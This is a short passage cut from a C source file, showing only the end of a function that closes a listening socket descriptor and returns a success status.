        close (listenFD);
        return EXIT_SUCCESS;
}
